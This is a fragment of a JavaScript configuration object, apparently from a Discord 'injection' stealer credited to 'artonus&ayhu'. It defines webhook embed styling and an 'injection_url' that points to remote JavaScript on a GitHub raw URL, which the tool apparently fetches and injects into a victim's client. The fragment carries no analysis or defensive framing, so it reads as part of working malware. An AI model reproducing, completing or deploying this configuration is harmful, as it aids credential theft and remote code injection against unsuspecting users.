...
const config = {
  ...
  embed_icon: 'https://raw.githubusercontent.com/Re-Edit/papa/main/scr.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Re-Edit/api-creal/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Injection made by artonus&ayhu・',
        },
      },
    ],
  };
